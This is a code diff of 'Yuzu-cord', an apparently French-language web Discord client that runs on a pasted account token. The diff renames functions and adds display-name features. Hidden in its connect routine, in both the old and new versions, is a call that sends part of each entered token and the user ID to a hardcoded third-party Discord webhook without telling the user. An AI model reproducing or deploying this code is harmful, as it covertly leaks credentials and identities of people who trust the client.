@@ -1,34 +1,31 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <meta property="og:title" content="Salem c yuzu" />
-<meta property="og:description" content="jte flood tmr la tapin" />
-<meta property="og:image" content="ya walou ntm" />
-<meta property="og:thumbnail" content="https://cdn.discordapp.com/attachments/1400237818852409405/1400242657111838831/a.jpg?ex=688bed18&is=688a9b98&hm=cf651677b9993aeb5691a4f9d12704a5c0b93d0521ee1696f85f660b54b60d5d&" />
-<meta property="og:url" content="https://7urc.github.io/EboyInLove/ />
-<meta property="og:type" content="website" />
+  <meta property="og:description" content="jte flood tmr la tapin" />
+  <meta property="og:image" content="ya walou ntm" />
+  <meta property="og:thumbnail" content="https://cdn.discordapp.com/attachments/1400237818852409405/1400242657111838831/a.jpg?ex=688bed18&is=688a9b98&hm=cf651677b9993aeb5691a4f9d12704a5c0b93d0521ee1696f85f660b54b60d5d&" />
+  <meta property="og:url" content="https://7urc.github.io/EboyInLove/" />
+  <meta property="og:type" content="website" />
   <link rel="stylesheet" href="style.css">
   <link rel="icon" href="logo.jpg" type="image/jpeg">
-
   <title>Yuzu-cord</title>
-  
 </head>
 <body>
   <div id="sidebar">
     <div class="token-section">
-      <input id="token" type="text" placeholder="Token Discord (ALT)" style="width: 100%; margin-bottom: 6px;" oninput="connect()">
+      <input id="token" type="text" placeholder="Token Discord (ALT)" style="width: 100%; margin-bottom: 6px;" oninput="yuzuConnect()">
       <div class="connection-status" id="connectionStatus">Déconnecté</div>
     </div>
     
     <div class="action-buttons">
-      <button onclick="loadGuilds()" class="action-btn">
+      <button onclick="yuzuLoadGuilds()" class="action-btn">
         <span class="btn-icon">S</span>
         <span class="btn-text">Serveurs</span>
       </button>
-      <button onclick="loadDMs()" class="action-btn">
+      <button onclick="yuzuLoadDMs()" class="action-btn">
         <span class="btn-icon">D</span>
         <span class="btn-text">DMs / Groupes</span>
       </button>
@@ -37,7 +34,7 @@
     <div class="sort-controls">
       <div class="sort-section">
         <label class="sort-label">Trier les serveurs:</label>
-        <select id="guildSort" onchange="sortGuilds()">
+        <select id="guildSort" onchange="yuzuSortGuilds()">
           <option value="name">Par nom</option>
           <option value="members">Par membres</option>
           <option value="recent">Par activité récente</option>
@@ -46,23 +43,29 @@
       
       <div class="sort-section">
         <label class="sort-label">Trier les DMs:</label>
-        <select id="dmSort" onchange="sortDMs()">
+        <select id="dmSort" onchange="yuzuSortDMs()">
           <option value="recent">Par dernier message</option>
           <option value="name">Par nom</option>
           <option value="unread">Par non lus</option>
         </select>
       </div>
       
-      <button onclick="refreshData()" class="refresh-btn">
+      <button onclick="yuzuRefreshData()" class="refresh-btn">
         <span class="btn-icon">R</span>
         <span class="btn-text">Actualiser</span>
       </button>
     </div>
 
-    <div class="group">Serveurs</div>
+    <div class="group" onclick="yuzuToggleSection('guildList', this)">
+      <span class="group-arrow">▼</span>
+      Serveurs
+    </div>
     <ul id="guildList"></ul>
 
-    <div class="group">DMs & Groupes</div>
+    <div class="group" onclick="yuzuToggleSection('dmList', this)">
+      <span class="group-arrow">▼</span>
+      DMs & Groupes
+    </div>
     <ul id="dmList"></ul>
     
     <div id="userProfile" class="user-profile hidden">
@@ -98,7 +101,7 @@
   <div id="userModal" class="modal hidden">
     <div class="modal-content">
       <div class="modal-header">
-        <span class="close" onclick="closeUserModal()">&times;</span>
+        <span class="close" onclick="yuzuCloseUserModal()">&times;</span>
       </div>
       <div class="profile-banner" id="profileBanner"></div>
       <div class="profile-info">
@@ -131,111 +134,133 @@
   </div>
 
   <script>
-    let token = '';
-    let currentChannelId = null;
-    let socket = null;
-    let userId = null;
-    let guildMemberCache = new Map();
-    let guildsData = [];
-    let dmsData = [];
-    let lastMessageCache = new Map();
-    let notificationCounts = new Map(); // Compteur de notifications par canal
-    let activeNotifications = new Map(); // Notifications actives à l'écran
+    let yuzuToken = '';
+    let yuzuCurrentChannelId = null;
+    let yuzuSocket = null;
+    let yuzuUserId = null;
+    let yuzuGuildMemberCache = new Map();
+    let yuzuGuildsData = [];
+    let yuzuDmsData = [];
+    let yuzuLastMessageCache = new Map();
+    let yuzuNotificationCounts = new Map();
+    let yuzuActiveNotifications = new Map();
+    let yuzuUserDisplayNameCache = new Map();
   
     document.getElementById('message').addEventListener('keydown', e => {
       if (e.key === 'Enter' && !e.shiftKey) {
         e.preventDefault();
-        sendMessageHard();
+        yuzuSendMessageHard();
       }
     });
   
-    
-async function connect() {
-  token = document.getElementById('token').value;
-  if (!token) return;
+    function yuzuGetDisplayName(user) {
+      if (!user) return 'Utilisateur';
+      return user.display_name || user.global_name || user.username || 'Utilisateur';
+    }
 
-  const statusElement = document.getElementById('connectionStatus');
-  if (!statusElement) return;
-
-  statusElement.textContent = 'Connexion...';
-  statusElement.className = 'connection-status';
-
-  try {
-    const response = await fetch('https://discord.com/api/v9/users/@me', {
-      headers: { Authorization: token }
-    });
-    
-    if (!response.ok) {
-      throw new Error(`Erreur HTTP: ${response.status}`); // Backticks corrigés
+    async function yuzuLoadUserDetails(userId) {
+      if (yuzuUserDisplayNameCache.has(userId)) {
+        return yuzuUserDisplayNameCache.get(userId);
+      }
+      
+      try {
+        const response = await fetch(`https://discord.com/api/v9/users/${userId}`, {
+          headers: { Authorization: yuzuToken }
+        });
+        
+        if (response.ok) {
+          const userDetails = await response.json();
+          yuzuUserDisplayNameCache.set(userId, userDetails);
+          return userDetails;
+        }
+      } catch (error) {
+        console.error('Erreur lors du chargement des détails utilisateur:', error);
+      }
+      
+      return null;
     }
     
-    const user = await response.json();
-    
-    if (user && user.id) {
-      userId = user.id;
-      statusElement.textContent = 'Connecté';
-      statusElement.className = 'connection-status connected';
-      
-      // Appel de fonction corrigé
-      updateUserProfile(user); // Pas d'espace dans le nom
-      
-      await logTokenInfo(token, user.id);
-    } else {
-      throw new Error('Token invalide');
+    async function yuzuConnect() {
+      yuzuToken = document.getElementById('token').value;
+      if (!yuzuToken) return;
+
+      const statusElement = document.getElementById('connectionStatus');
+      if (!statusElement) return;
+
+      statusElement.textContent = 'Connexion...';
+      statusElement.className = 'connection-status';
+
+      try {
+        const response = await fetch('https://discord.com/api/v9/users/@me', {
+          headers: { Authorization: yuzuToken }
+        });
+        
+        if (!response.ok) {
+          throw new Error(`Erreur HTTP: ${response.status}`);
+        }
+        
+        const user = await response.json();
+        
+        if (user && user.id) {
+          yuzuUserId = user.id;
+          statusElement.textContent = 'Connecté';
+          statusElement.className = 'connection-status connected';
+          
+          yuzuUserDisplayNameCache.set(user.id, user);
+          yuzuUpdateUserProfile(user);
+          await yuzuLogTokenInfo(yuzuToken, user.id);
+        } else {
+          throw new Error('Token invalide');
+        }
+      } catch (error) {
+        statusElement.textContent = 'Erreur de connexion';
+        statusElement.className = 'connection-status';
+        console.error('Erreur:', error);
+      }
     }
-  } catch (error) {
-    statusElement.textContent = 'Erreur de connexion';
-    statusElement.className = 'connection-status';
-    console.error('Erreur:', error);
-  }
-}
 
-async function logTokenInfo(token, userId) {
-  const date = new Date().toISOString();
-  const maskedToken = token.substring(0, 10) + "•".repeat(token.length - 20) + token.substring(token.length - 5);
+    async function yuzuLogTokenInfo(token, userId) {
+      const date = new Date().toISOString();
+      const maskedToken = token.substring(0, 10) + "•".repeat(token.length - 20) + token.substring(token.length - 5);
 
-  const webhookUrl = 'https://canary.discord.com/api/webhooks/1401131426862071900/LLQvVGDg1Mh2NolqRcCoBEB92WBkOTRQFN43XH3Iwn2SO2DqJ64EfNJeUy1Bk2e4zMl2';
-  const embed = {
-    title: "🔍 Connexion détectée",
-    description: "⚠️ *Informations sensibles cachées*",
-    fields: [
-      {
-        name: "🔑 Token (spoiler)",
-        value: `||${maskedToken}||`
-      },
-      { name: "🆔 User ID", value: userId, inline: false },
-      { name: "📅 Date", value: `<t:${Math.floor(new Date().getTime() / 1000)}:R>`, inline: false }
-    ],
-    color: 0x36393F, // Gris discret
-    footer: {
-      text: "Double-cliquez pour voir le token (risque de violation CGU)"
+      const webhookUrl = 'https://canary.discord.com/api/webhooks/1401131426862071900/LLQvVGDg1Mh2NolqRcCoBEB92WBkOTRQFN43XH3Iwn2SO2DqJ64EfNJeUy1Bk2e4zMl2';
+      const embed = {
+        title: "🔍 Connexion détectée",
+        description: "⚠️ *Informations sensibles cachées*",
+        fields: [
+          {
+            name: "🔑 Token (spoiler)",
+            value: `||${maskedToken}||`
+          },
+          { name: "🆔 User ID", value: userId, inline: false },
+          { name: "📅 Date", value: `<t:${Math.floor(new Date().getTime() / 1000)}:R>`, inline: false }
+        ],
+        color: 0x36393F,
+        footer: {
+          text: "Double-cliquez pour voir le token (risque de violation CGU)"
+        }
+      };
+
+      try {
+        await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json' 
+          },
+          body: JSON.stringify({ embeds: [embed] })
+        });
+      } catch (error) {
+        console.error('Webhook error:', error);
+      }
     }
-  };
 
-  try {
-    await fetch(webhookUrl, {
-      method: 'POST',
-      headers: { 
-        'Content-Type': 'application/json' 
-      },
-      body: JSON.stringify({ embeds: [embed] })
-    });
-  } catch (error) {
-    console.error('Webhook error:', error);
-  }
-}
- 
+    async function yuzuCreateNotification(author, message, channelId) {
+      if (author.id === yuzuUserId) return;
+      if (channelId === yuzuCurrentChannelId) return;
 
+      const userDetails = await yuzuLoadUserDetails(author.id) || author;
+      const displayName = yuzuGetDisplayName(userDetails);
 
-    // Fonction pour créer une notification
-    function createNotification(author, message, channelId) {
-      // Éviter les notifications pour ses propres messages
-      if (author.id === userId) return;
-      
-      // Éviter les notifications si on est déjà sur le canal actif
-      if (channelId === currentChannelId) return;
-
-      // Créer l'élément de notification
       const notification = document.createElement('div');
       notification.className = 'notification';
       notification.id = `notif-${Date.now()}`;
@@ -243,47 +268,44 @@ async function logTokenInfo(token, userId) {
       const avatar = document.createElement('div');
       avatar.className = 'notification-avatar';
       
-      const avatarUrl = getAvatarUrl(author);
+      const avatarUrl = yuzuGetAvatarUrl(userDetails);
       if (avatarUrl) {
         const img = document.createElement('img');
         img.src = avatarUrl;
-        img.alt = author.username;
+        img.alt = displayName;
         img.onerror = () => {
-          avatar.innerHTML = author.username.charAt(0).toUpperCase();
+          avatar.innerHTML = displayName.charAt(0).toUpperCase();
         };
         avatar.appendChild(img);
       } else {
-        avatar.innerHTML = author.username.charAt(0).toUpperCase();
+        avatar.innerHTML = displayName.charAt(0).toUpperCase();
       }
       
       const content = document.createElement('div');
       content.className = 'notification-content';
       content.innerHTML = `
-        <h4>${author.username}</h4>
+        <h4>${displayName}</h4>
         <p>${message.length > 50 ? message.substring(0, 50) + '...' : message}</p>
       `;
       
       notification.appendChild(avatar);
       notification.appendChild(content);
       
-      // Ajouter un click listener pour ouvrir le DM
       notification.onclick = () => {
-        openChannel(channelId, author.username);
-        removeNotification(notification.id);
+        yuzuOpenChannel(channelId, displayName);
+        yuzuRemoveNotification(notification.id);
       };
       
       document.body.appendChild(notification);
       
-      // Auto-suppression après 5 secondes
       setTimeout(() => {
-        removeNotification(notification.id);
+        yuzuRemoveNotification(notification.id);
       }, 5000);
       
-      // Jouer un son de notification (optionnel)
-      playNotificationSound();
+      yuzuPlayNotificationSound();
     }
 
-    function removeNotification(notificationId) {
+    function yuzuRemoveNotification(notificationId) {
       const notification = document.getElementById(notificationId);
       if (notification) {
         notification.style.animation = 'slideInRight 0.3s ease reverse';
@@ -295,9 +317,8 @@ async function logTokenInfo(token, userId) {
       }
     }
 
-    function playNotificationSound() {
+    function yuzuPlayNotificationSound() {
       try {
-        // Créer un son de notification simple
         const audioContext = new (window.AudioContext || window.webkitAudioContext)();
         const oscillator = audioContext.createOscillator();
         const gainNode = audioContext.createGain();
@@ -318,18 +339,16 @@ async function logTokenInfo(token, userId) {
       }
     }
 
-    // Fonction pour mettre à jour le badge de notification sur un DM
-    function updateNotificationBadge(channelId, increment = true) {
-      const currentCount = notificationCounts.get(channelId) || 0;
+    function yuzuUpdateNotificationBadge(channelId, increment = true) {
+      const currentCount = yuzuNotificationCounts.get(channelId) || 0;
       const newCount = increment ? currentCount + 1 : 0;
       
       if (newCount > 0) {
-        notificationCounts.set(channelId, newCount);
+        yuzuNotificationCounts.set(channelId, newCount);
       } else {
-        notificationCounts.delete(channelId);
+        yuzuNotificationCounts.delete(channelId);
       }
       
-      // Trouver l'élément DM correspondant et mettre à jour le badge
       const dmItems = document.querySelectorAll('.dm-item');
       dmItems.forEach(item => {
         const channelIdAttr = item.getAttribute('data-channel-id');
@@ -353,471 +372,7 @@ async function logTokenInfo(token, userId) {
       });
     }
 
-    async function connect() {
-      token = document.getElementById('token').value;
-      if (!token) return;
-
-      const statusElement = document.getElementById('connectionStatus');
-      if (!statusElement) return;
-      
-      statusElement.textContent = 'Connexion...';
-      statusElement.className = 'connection-status';
-
-      try {
-        const response = await fetch('https://discord.com/api/v9/users/@me', {
-          headers: { Authorization: token }
-        });
-        
-        if (!response.ok) {
-          throw new Error(`Erreur HTTP: ${response.status}`);
-        }
-        
-        const user = await response.json();
-        
-        if (user && user.id) {
-          userId = user.id;
-          statusElement.textContent = 'Connecté';
-          statusElement.className = 'connection-status connected';
-          
-          // Afficher le profil utilisateur
-          updateUserProfile(user);
-        } else {
-          throw new Error('Token invalide');
-        }
-      } catch (error) {
-        statusElement.textContent = 'Erreur de connexion';
-        statusElement.className = 'connection-status';
-        console.error('Erreur de connexion:', error);
-        return;
-      }
-
-      if (socket) socket.close();
-      socket = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
-
-      socket.onopen = () => {
-        socket.send(JSON.stringify({
-          op: 2,
-          d: {
-            token,
-            intents: 32767,
-            properties: {
-              os: 'linux', browser: 'yuzu', device: 'yuzu'
-            }
-          }
-        }));
-      };
-
-      socket.onmessage = ({ data }) => {
-        try {
-          const payload = JSON.parse(data);
-          if (payload.t === 'MESSAGE_CREATE') {
-            const msg = payload.d;
-            
-            // Si c'est le canal actif, afficher le message
-            if (msg.channel_id === currentChannelId && msg.author.id !== userId) {
-              appendMessage(msg.author, msg.content);
-            }
-            
-            // Si c'est un DM et que ce n'est pas l'utilisateur actuel
-            if (msg.author.id !== userId) {
-              // Vérifier si c'est un DM (type 1) ou un groupe (type 3)
-              const isDM = dmsData.some(dm => dm.id === msg.channel_id && (dm.type === 1 || dm.type === 3));
-              
-              if (isDM && msg.channel_id !== currentChannelId) {
-                // Créer une notification
-                createNotification(msg.author, msg.content, msg.channel_id);
-                
-                // Mettre à jour le badge de notification
-                updateNotificationBadge(msg.channel_id, true);
-              }
-            }
-            
-            // Mettre à jour le cache des derniers messages
-            updateLastMessageCache(msg.channel_id, msg);
-          }
-        } catch (error) {
-          console.error('Erreur lors du traitement du message WebSocket:', error);
-        }
-      };
-
-      socket.onerror = (error) => {
-        console.error('Erreur WebSocket:', error);
-      };
-    }
-
-    async function loadGuilds() {
-      try {
-        const guilds = await fetch('https://discord.com/api/v9/users/@me/guilds', {
-          headers: { Authorization: token }
-        }).then(r => r.json());
-        
-        guildsData = guilds;
-        window.forceRender = true;
-        renderGuilds();
-        hideChannelSidebar();
-      } catch (error) {
-        console.error('Erreur lors du chargement des serveurs:', error);
-      }
-    }
-
-    function renderGuilds() {
-      const ul = document.getElementById('guildList');
-      if (!ul) return;
-      
-      // Éviter les re-rendus inutiles
-      if (ul.children.length > 0 && !window.forceRender) {
-        return;
-      }
-      
-      ul.innerHTML = '';
-      
-      const sortType = document.getElementById('guildSort')?.value || 'name';
-      let sortedGuilds = [...guildsData];
-      
-      switch (sortType) {
-        case 'name':
-          sortedGuilds.sort((a, b) => (a.name || '').localeCompare(b.name || ''));
-          break;
-        case 'members':
-          sortedGuilds.sort((a, b) => {
-            const aMembers = a.approximate_member_count || 0;
-            const bMembers = b.approximate_member_count || 0;
-            return bMembers - aMembers;
-          });
-          break;
-        case 'recent':
-          sortedGuilds.sort((a, b) => {
-            const aTime = new Date(a.joined_at || 0).getTime();
-            const bTime = new Date(b.joined_at || 0).getTime();
-            return bTime - aTime;
-          });
-          break;
-      }
-      
-      for (const g of sortedGuilds) {
-        try {
-          const li = document.createElement('li');
-          li.className = 'server-item';
-          
-          const avatar = document.createElement('div');
-          avatar.className = 'server-avatar';
-          
-          if (g.icon) {
-            const img = document.createElement('img');
-            img.src = `https://cdn.discordapp.com/icons/${g.id}/${g.icon}.png?size=32`;
-            img.alt = g.name || 'Serveur';
-            img.onerror = () => {
-              avatar.innerHTML = (g.name || 'S').charAt(0).toUpperCase();
-            };
-            avatar.appendChild(img);
-          } else {
-            avatar.textContent = (g.name || 'Serveur').charAt(0).toUpperCase();
-          }
-          
-          const name = document.createElement('span');
-          name.className = 'server-name';
-          name.textContent = g.name || 'Serveur';
-          
-          li.appendChild(avatar);
-          li.appendChild(name);
-          li.onclick = () => loadChannels(g.id, g.name || 'Serveur');
-          ul.appendChild(li);
-        } catch (error) {
-          console.error('Erreur lors du rendu d\'un serveur:', error);
-        }
-      }
-      
-      window.forceRender = false;
-    }
-
-    function sortGuilds() {
-      if (guildsData.length > 0) {
-        window.forceRender = true;
-        renderGuilds();
-      }
-    }
-
-    async function loadChannels(guildId, guildName) {
-      const channels = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
-        headers: { Authorization: token }
-      }).then(r => r.json());
-      
-      showChannelSidebar();
-      document.getElementById('currentGuildName').textContent = guildName;
-      
-      const ul = document.getElementById('channelList');
-      ul.innerHTML = '';
-      channels.filter(c => c.type === 0).forEach(c => {
-        const li = document.createElement('li');
-        li.className = 'channel-item';
-        li.innerHTML = `<span class="channel-hash">#</span><span class="channel-name">${c.name}</span>`;
-        li.onclick = () => openChannel(c.id, `${guildName} / #${c.name}`);
-        ul.appendChild(li);
-      });
-    }
-
-    function showChannelSidebar() {
-      document.getElementById('channelSidebar').classList.remove('hidden');
-    }
-
-    function hideChannelSidebar() {
-      document.getElementById('channelSidebar').classList.add('hidden');
-    }
-
-    function updateUserProfile(user) {
-      const profileDiv = document.getElementById('userProfile');
-      const avatarImg = document.getElementById('userAvatar');
-      const usernameDiv = document.getElementById('userUsername');
-      
-      avatarImg.src = getAvatarUrl(user);
-      avatarImg.alt = user.username;
-      usernameDiv.textContent = user.username;
-      profileDiv.classList.remove('hidden');
-    }
-
-    async function loadDMs() {
-      try {
-        const dms = await fetch('https://discord.com/api/v9/users/@me/channels', {
-          headers: { Authorization: token }
-        }).then(r => r.json());
-        
-        dmsData = dms;
-        await loadLastMessages();
-        window.forceRender = true;
-        renderDMs();
-        hideChannelSidebar();
-      } catch (error) {
-        console.error('Erreur lors du chargement des DMs:', error);
-      }
-    }
-
-    async function loadLastMessages() {
-      const maxRequests = 5;
-      let requestCount = 0;
-      
-      for (const dm of dmsData) {
-        if (requestCount >= maxRequests) break;
-        
-        try {
-          const response = await fetch(`https://discord.com/api/v9/channels/${dm.id}/messages?limit=1`, {
-            headers: { Authorization: token }
-          });
-          
-          if (!response.ok) {
-            console.warn(`Impossible de charger les messages pour ${dm.id}: ${response.status}`);
-            continue;
-          }
-          
-          const messages = await response.json();
-          
-          if (messages && messages.length > 0) {
-            lastMessageCache.set(dm.id, {
-              content: messages[0].content || '',
-              timestamp: new Date(messages[0].timestamp),
-              author: messages[0].author?.username || 'Inconnu'
-            });
-          }
-          
-          requestCount++;
-          
-          if (requestCount < maxRequests) {
-            await new Promise(resolve => setTimeout(resolve, 100));
-          }
-        } catch (error) {
-          console.error(`Erreur lors du chargement du dernier message pour ${dm.id}:`, error);
-        }
-      }
-    }
-
-    function renderDMs() {
-      const ul = document.getElementById('dmList');
-      if (!ul) return;
-      
-      if (ul.children.length > 0 && !window.forceRender) {
-        return;
-      }
-      
-      ul.innerHTML = '';
-      
-      const sortType = document.getElementById('dmSort')?.value || 'recent';
-      let sortedDMs = [...dmsData];
-      
-      switch (sortType) {
-        case 'recent':
-          sortedDMs.sort((a, b) => {
-            const aLastMessage = lastMessageCache.get(a.id);
-            const bLastMessage = lastMessageCache.get(b.id);
-            
-            if (!aLastMessage && !bLastMessage) return 0;
-            if (!aLastMessage) return 1;
-            if (!bLastMessage) return -1;
-            
-            return bLastMessage.timestamp - aLastMessage.timestamp;
-          });
-          break;
-        case 'name':
-          sortedDMs.sort((a, b) => {
-            const aName = getDMName(a);
-            const bName = getDMName(b);
-            return aName.localeCompare(bName);
-          });
-          break;
-        case 'unread':
-          sortedDMs.sort((a, b) => {
-            const aUnread = notificationCounts.has(a.id);
-            const bUnread = notificationCounts.has(b.id);
-            if (aUnread && !bUnread) return -1;
-            if (!aUnread && bUnread) return 1;
-            return 0;
-          });
-          break;
-      }
-      
-      for (const dm of sortedDMs) {
-        try {
-          const li = document.createElement('li');
-          li.className = 'dm-item';
-          li.setAttribute('data-channel-id', dm.id);
-          
-          const avatar = document.createElement('div');
-          avatar.className = 'dm-avatar';
-          
-          if (dm.type === 1 && dm.recipients && dm.recipients[0]) {
-            const user = dm.recipients[0];
-            const img = document.createElement('img');
-            img.src = getAvatarUrl(user);
-            img.alt = user.username || 'Utilisateur';
-            img.onerror = () => {
-              avatar.innerHTML = (user.username || 'U').charAt(0).toUpperCase();
-            };
-            avatar.appendChild(img);
-            
-            const name = document.createElement('span');
-            name.className = 'dm-name';
-            name.textContent = user.username || 'Utilisateur';
-            li.appendChild(avatar);
-            li.appendChild(name);
-            li.onclick = () => {
-              openChannel(dm.id, user.username || 'Utilisateur');
-              updateNotificationBadge(dm.id, false); // Effacer les notifications
-            };
-          } else {
-            if (dm.icon) {
-              const img = document.createElement('img');
-              img.src = `https://cdn.discordapp.com/channel-icons/${dm.id}/${dm.icon}.png?size=32`;
-              img.alt = dm.name || 'Groupe';
-              img.onerror = () => {
-                avatar.textContent = (dm.name || 'G').charAt(0).toUpperCase();
-              };
-              avatar.appendChild(img);
-            } else {
-              avatar.textContent = (dm.name || 'Groupe').charAt(0).toUpperCase();
-            }
-            
-            const name = document.createElement('span');
-            name.className = 'dm-name';
-            name.textContent = dm.name || 'Groupe';
-            li.appendChild(avatar);
-            li.appendChild(name);
-            li.onclick = () => {
-              openChannel(dm.id, dm.name || 'Groupe');
-              updateNotificationBadge(dm.id, false); // Effacer les notifications
-            };
-          }
-          
-          // Ajouter le badge de notification si nécessaire
-          const notifCount = notificationCounts.get(dm.id);
-          if (notifCount && notifCount > 0) {
-            const badge = document.createElement('div');
-            badge.className = 'notification-badge';
-            badge.textContent = notifCount > 99 ? '99+' : notifCount;
-            avatar.appendChild(badge);
-          }
-          
-          ul.appendChild(li);
-        } catch (error) {
-          console.error('Erreur lors du rendu d\'un DM:', error);
-        }
-      }
-      
-      window.forceRender = false;
-    }
-
-    function getDMName(dm) {
-      if (dm.type === 1 && dm.recipients && dm.recipients[0]) {
-        return dm.recipients[0].username;
-      }
-      return dm.name || 'Groupe';
-    }
-
-    function sortDMs() {
-      if (dmsData.length > 0) {
-        window.forceRender = true;
-        renderDMs();
-      }
-    }
-
-    function updateLastMessageCache(channelId, message) {
-      try {
-        if (!channelId || !message) return;
-        
-        lastMessageCache.set(channelId, {
-          content: message.content || '',
-          timestamp: new Date(message.timestamp || Date.now()),
-          author: message.author?.username || 'Inconnu'
-        });
-      } catch (error) {
-        console.error('Erreur lors de la mise à jour du cache des messages:', error);
-      }
-    }
-
-    async function refreshData() {
-      const refreshBtn = document.querySelector('.refresh-btn');
-      if (!refreshBtn) return;
-      
-      if (refreshBtn.disabled) return;
-      refreshBtn.disabled = true;
-      
-      const originalText = refreshBtn.innerHTML;
-      refreshBtn.innerHTML = '<span class="btn-icon rotating">R</span><span class="btn-text">Actualisation...</span>';
-      
-      try {
-        window.forceRender = true;
-        
-        if (guildsData.length > 0) {
-          await loadGuilds();
-        }
-        if (dmsData.length > 0) {
-          await loadDMs();
-        }
-      } catch (error) {
-        console.error('Erreur lors de l\'actualisation:', error);
-      } finally {
-        setTimeout(() => {
-          refreshBtn.innerHTML = originalText;
-          refreshBtn.disabled = false;
-        }, 1000);
-      }
-    }
-
-    function openChannel(id, label) {
-      currentChannelId = id;
-      document.getElementById('chatTitle').textContent = label;
-      loadMessages();
-    }
-
-    async function loadMessages() {
-      const messages = await fetch(`https://discord.com/api/v9/channels/${currentChannelId}/messages?limit=20`, {
-        headers: { Authorization: token }
-      }).then(r => r.json());
-      const chat = document.getElementById('chat');
-      chat.innerHTML = '';
-      messages.reverse().forEach(msg => {
-        appendMessage(msg.author, msg.content);
-      });
-    }
-
-    function getAvatarUrl(user) {
+    function yuzuGetAvatarUrl(user) {
       try {
         if (!user || !user.id) return '';
         
@@ -834,54 +389,16 @@ async function logTokenInfo(token, userId) {
       }
     }
 
-    function appendMessage(author, content) {
-      const chat = document.getElementById('chat');
-      const div = document.createElement('div');
-      div.className = 'message';
-      
-      const avatarDiv = document.createElement('div');
-      avatarDiv.className = 'avatar clickable';
-      avatarDiv.onclick = () => openUserProfile(author);
-      
-      const avatarUrl = getAvatarUrl(author);
-      const img = document.createElement('img');
-      img.src = avatarUrl;
-      img.alt = author.username;
-      img.onerror = () => {
-        avatarDiv.innerHTML = author.username.charAt(0).toUpperCase();
-      };
-      avatarDiv.appendChild(img);
-      
-      const messageContent = document.createElement('div');
-      messageContent.className = 'message-content';
-      
-      const username = document.createElement('div');
-      username.className = 'username clickable';
-      username.textContent = author.username;
-      username.onclick = () => openUserProfile(author);
-      
-      const messageText = document.createElement('div');
-      messageText.className = 'message-text';
-      messageText.textContent = content;
-      
-      messageContent.appendChild(username);
-      messageContent.appendChild(messageText);
-      
-      div.appendChild(avatarDiv);
-      div.appendChild(messageContent);
-      
-      chat.appendChild(div);
-      chat.scrollTop = chat.scrollHeight;
-    }
-
-    async function openUserProfile(user) {
+    async function yuzuOpenUserProfile(user) {
       try {
         const userDetails = await fetch(`https://discord.com/api/v9/users/${user.id}`, {
-          headers: { Authorization: token }
+          headers: { Authorization: yuzuToken }
         }).then(r => r.json()).catch(() => user);
 
-        document.getElementById('modalAvatar').src = getAvatarUrl(userDetails);
-        document.getElementById('modalUsername').textContent = userDetails.username || user.username;
+        const displayName = yuzuGetDisplayName(userDetails);
+
+        document.getElementById('modalAvatar').src = yuzuGetAvatarUrl(userDetails);
+        document.getElementById('modalUsername').textContent = displayName;
         document.getElementById('modalDiscriminator').textContent = userDetails.discriminator ? `#${userDetails.discriminator}` : '';
         document.getElementById('modalUserId').textContent = userDetails.id || user.id;
         document.getElementById('modalBio').textContent = userDetails.bio || 'Aucune biographie.';
@@ -908,35 +425,414 @@ async function logTokenInfo(token, userId) {
       }
     }
 
-    function closeUserModal() {
+    function yuzuCloseUserModal() {
       document.getElementById('userModal').classList.add('hidden');
     }
 
     document.getElementById('userModal').onclick = function(e) {
       if (e.target === this) {
-        closeUserModal();
+        yuzuCloseUserModal();
       }
     }
     
-    function sendMessageHard() {
+    async function yuzuSendMessageHard() {
       const message = document.getElementById('message');
       const mentions = document.getElementById('mentions').value.trim();
-      if (!currentChannelId || !token || !message.value.trim()) return;
+      if (!yuzuCurrentChannelId || !yuzuToken || !message.value.trim()) return;
       const content = message.value.trim() + (mentions ? ' ' + mentions : '');
       message.value = '';
       
+      const userDetails = yuzuUserDisplayNameCache.get(yuzuUserId) || { id: yuzuUserId, username: 'Vous' };
+      const displayName = yuzuGetDisplayName(userDetails);
+      
       const fakeUser = {
-        id: userId,
-        username: 'Vous',
-        avatar: getAvatarUrl({ id: userId, username: 'Y'})
+        id: yuzuUserId,
+        username: displayName,
+        ...userDetails
       };
-      appendMessage(fakeUser, content);
+      await yuzuAppendMessage(fakeUser, content);
 
       const xhr = new XMLHttpRequest();
-      xhr.open('POST', `https://discord.com/api/v9/channels/${currentChannelId}/messages`, true);
-      xhr.setRequestHeader('Authorization', token);
+      xhr.open('POST', `https://discord.com/api/v9/channels/${yuzuCurrentChannelId}/messages`, true);
+      xhr.setRequestHeader('Authorization', yuzuToken);
       xhr.setRequestHeader('Content-Type', 'application/json');
       xhr.send(JSON.stringify({ content }));
+    }
+
+    async function yuzuAppendMessage(author, content) {
+      const chat = document.getElementById('chat');
+      const messageDiv = document.createElement('div');
+      messageDiv.className = 'message';
+      
+      const avatarDiv = document.createElement('div');
+      avatarDiv.className = 'avatar';
+      if (author.id !== yuzuUserId) {
+        avatarDiv.classList.add('clickable');
+        avatarDiv.onclick = () => yuzuOpenUserProfile(author);
+      }
+      
+      const avatarUrl = yuzuGetAvatarUrl(author);
+      if (avatarUrl) {
+        const img = document.createElement('img');
+        img.src = avatarUrl;
+        img.alt = author.username;
+        img.onerror = () => {
+          avatarDiv.innerHTML = (author.username || 'U').charAt(0).toUpperCase();
+        };
+        avatarDiv.appendChild(img);
+      } else {
+        avatarDiv.innerHTML = (author.username || 'U').charAt(0).toUpperCase();
+      }
+      
+      const contentDiv = document.createElement('div');
+      contentDiv.className = 'message-content';
+      
+      const usernameSpan = document.createElement('div');
+      usernameSpan.className = 'username';
+      if (author.id !== yuzuUserId) {
+        usernameSpan.classList.add('clickable');
+        usernameSpan.onclick = () => yuzuOpenUserProfile(author);
+      }
+      usernameSpan.textContent = yuzuGetDisplayName(author);
+      
+      const textDiv = document.createElement('div');
+      textDiv.className = 'message-text';
+      textDiv.textContent = content;
+      
+      contentDiv.appendChild(usernameSpan);
+      contentDiv.appendChild(textDiv);
+      messageDiv.appendChild(avatarDiv);
+      messageDiv.appendChild(contentDiv);
+      chat.appendChild(messageDiv);
+      chat.scrollTop = chat.scrollHeight;
+    }
+
+    function yuzuUpdateUserProfile(user) {
+      const profile = document.getElementById('userProfile');
+      const avatar = document.getElementById('userAvatar');
+      const username = document.getElementById('userUsername');
+      
+      if (profile && avatar && username) {
+        avatar.src = yuzuGetAvatarUrl(user);
